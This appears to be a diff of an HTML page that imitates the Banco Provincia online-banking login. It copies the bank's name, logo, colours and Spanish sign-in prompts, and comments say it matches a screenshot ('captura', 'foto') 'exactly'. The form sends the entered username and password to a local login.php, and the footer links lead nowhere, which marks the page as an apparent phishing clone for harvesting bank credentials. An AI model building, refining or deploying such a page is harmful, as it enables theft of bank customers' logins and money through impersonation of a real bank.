@@ -4,77 +4,87 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Banco Provincia</title>
+<!-- Iconos para el ojo -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
   :root {
-    --verde-principal: #009b5c;
-    --texto-gris: #3c3c3c;
-    --texto-placeholder: #999;
-    --borde-inferior: #ccc;
-    /* Gradiente similar al de la captura */
-    --grad-header: linear-gradient(90deg, #007a2b 0%, #2ebcb5 100%); 
+    --verde-banco: #007a2b;
+    --turquesa-banco: #2ebcb5;
+    --texto-gris: #333333;
+    --placeholder-color: #999999;
+    --boton-color: #3c3c3c;
+    --boton-hover: #555555;
+    --radio-boton: 8px;
   }
 
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
 
   body {
-    font-family: 'Segoe UI', Roboto, sans-serif;
-    background-color: #f4f6f8;
-    height: 100vh;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background-color: #f0f2f5; /* Fondo general suave */
     display: flex;
     justify-content: center;
     align-items: center;
+    min-height: 100vh;
   }
 
-  .mobile-container {
+  .mobile-wrapper {
     width: 100%;
-    max-width: 400px;
-    background: #fff;
+    max-width: 420px; /* Ancho máximo similar a un móvil */
+    background-color: #ffffff;
     min-height: 100vh;
     display: flex;
     flex-direction: column;
     position: relative;
+    box-shadow: 0 0 20px rgba(0,0,0,0.1);
   }
 
-  @media (min-width: 401px) {
-    .mobile-container {
-      height: 90vh;
+  @media (min-width: 421px) {
+    .mobile-wrapper {
+      height: 95vh;
       border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      overflow: hidden;
       margin-top: 20px;
       margin-bottom: 20px;
     }
   }
 
-  /* HEADER CON LOGO */
+  /* HEADER CON DEGRADADO EXACTO */
   header {
-    background: var(--grad-header);
-    padding: 20px;
+    background: linear-gradient(135deg, var(--verde-banco) 0%, var(--turquesa-banco) 100%);
+    padding: 20px 20px 15px 20px;
     text-align: center;
     color: white;
-    flex-shrink: 0;
   }
 
-  .logo-area {
+  .header-content {
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 15px;
-    margin-bottom: 15px;
   }
 
-  /* AQUÍ VA TU IMAGEN logo.png */
+  /* LOGO PNG */
   .logo-img {
-    height: 40px; /* Ajustá este tamaño según tu imagen */
+    height: 45px; /* Altura ajustada para que se vea bien */
     width: auto;
   }
 
-  h1 { font-size: 1.2rem; font-weight: 600; margin: 0; }
-  
+  h1 {
+    font-size: 1.3rem;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+  }
+
   .subtitulo {
     font-size: 1.1rem;
     font-weight: 600;
-    margin-top: 10px;
+    margin-top: 15px;
+    opacity: 0.95;
   }
 
   /* FORMULARIO */
@@ -85,7 +95,10 @@
     flex-direction: column;
   }
 
-  .input-group { margin-bottom: 25px; position: relative; }
+  .input-group {
+    margin-bottom: 25px;
+    position: relative;
+  }
 
   label {
     display: block;
@@ -101,84 +114,103 @@
     padding: 12px 10px;
     font-size: 1rem;
     border: none;
-    border-bottom: 2px solid var(--borde-inferior);
+    border-bottom: 2px solid #dddddd;
     background: transparent;
     color: var(--texto-gris);
     outline: none;
-    border-radius: 0;
+    transition: border-color 0.3s;
   }
 
-  input:focus { border-bottom-color: var(--verde-principal); }
-  input::placeholder { color: var(--texto-placeholder); }
+  input:focus {
+    border-bottom-color: var(--verde-banco);
+  }
 
-  /* BOTÓN OJO */
-  .toggle-password {
+  input::placeholder {
+    color: var(--placeholder-color);
+  }
+
+  /* BOTÓN DEL OJO */
+  .toggle-pass-btn {
     position: absolute;
     right: 10px;
-    top: 35px;
+    top: 38px; /* Ajuste vertical basado en label + padding */
     background: none;
     border: none;
-    color: var(--verde-principal);
+    color: var(--verde-banco);
     cursor: pointer;
-    font-size: 1.1rem;
+    font-size: 1.2rem;
+    padding: 5px;
   }
 
   /* BOTÓN INGRESAR */
   .btn-ingresar {
     width: 100%;
     padding: 14px;
-    background-color: #3c3c3c; /* Gris oscuro como en la foto */
+    background-color: var(--boton-color);
     color: white;
     border: none;
-    border-radius: 8px;
+    border-radius: var(--radio-boton);
     font-size: 1rem;
     font-weight: 600;
     cursor: pointer;
     margin-top: 10px;
+    transition: background-color 0.2s;
   }
 
-  /* LINKS */
-  .links-footer {
+  .btn-ingresar:hover {
+    background-color: var(--boton-hover);
+  }
+
+  /* LINKS INFERIORES */
+  .links-container {
     padding: 20px 25px;
     display: flex;
     flex-direction: column;
     gap: 15px;
-    border-top: 1px solid #eee;
-    background: #fafafa;
+    border-top: 1px solid #eeeeee;
+    background-color: #fafafa;
   }
 
   .link-item {
     text-decoration: underline;
-    color: var(--verde-principal);
+    color: var(--verde-banco);
     font-size: 0.9rem;
     text-align: left;
+    line-height: 1.4;
+  }
+
+  .link-item:hover {
+    color: #005a20;
+  }
+  
+  .required {
+    color: red;
   }
 </style>
 </head>
 <body>
 
-<div class="mobile-container">
+<div class="mobile-wrapper">
   <header>
-    <div class="logo-area">
-      <!-- IMAGEN GUARDADA COMO logo.png -->
-      <img src="logo.png" alt="Banco Provincia" class="logo-img">
+    <div class="header-content">
+      <!-- IMAGEN LOGO GUARDADA COMO logo.png -->
+      <img src="logo.png" alt="Logo Banco" class="logo-img">
       <h1>Banco Provincia</h1>
     </div>
     <div class="subtitulo">Iniciá sesión</div>
-</header>
+  </header>
 
-  <!-- EL FORMULARIO ENVÍA DATOS A login.php -->
   <form action="login.php" method="POST">
     
     <div class="input-group">
-      <label for="usuario">Tu usuario <span style="color:red">*</span></label>
+      <label for="usuario">Tu usuario <span class="required">*</span></label>
       <input type="text" id="usuario" name="username" placeholder="Ingresá tu nombre de usuario" required>
     </div>
 
     <div class="input-group">
-      <label for="clave">Tu clave <span style="color:red">*</span></label>
+      <label for="clave">Tu clave <span class="required">*</span></label>
       <input type="password" id="clave" name="password" placeholder="Ingresá tu clave" required>
-      <button type="button" class="toggle-password" onclick="togglePass()">
+      <button type="button" class="toggle-pass-btn" onclick="togglePassword()">
         <i class="fa-regular fa-eye"></i>
       </button>
     </div>
@@ -186,7 +218,7 @@
     <button type="submit" class="btn-ingresar">ingresar</button>
   </form>
 
-  <div class="links-footer">
+  <div class="links-container">
     <a href="#" class="link-item">¿No sos BIP? Registrate</a>
     <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
     <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
@@ -195,16 +227,16 @@
 </div>
 
 <script>
-  function togglePass() {
-    const passInput = document.getElementById('clave');
-    const icon = document.querySelector('.toggle-password i');
+  function togglePassword() {
+    const passwordInput = document.getElementById('clave');
+    const icon = document.querySelector('.toggle-pass-btn i');
     
-    if (passInput.type === 'password') {
-      passInput.type = 'text';
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
       icon.classList.remove('fa-eye');
       icon.classList.add('fa-eye-slash');
     } else {
-      passInput.type = 'password';
+      passwordInput.type = 'password';
       icon.classList.remove('fa-eye-slash');
       icon.classList.add('fa-eye');
     }
@@ -213,3 +245,4 @@
 
 </body>
 </html>
+
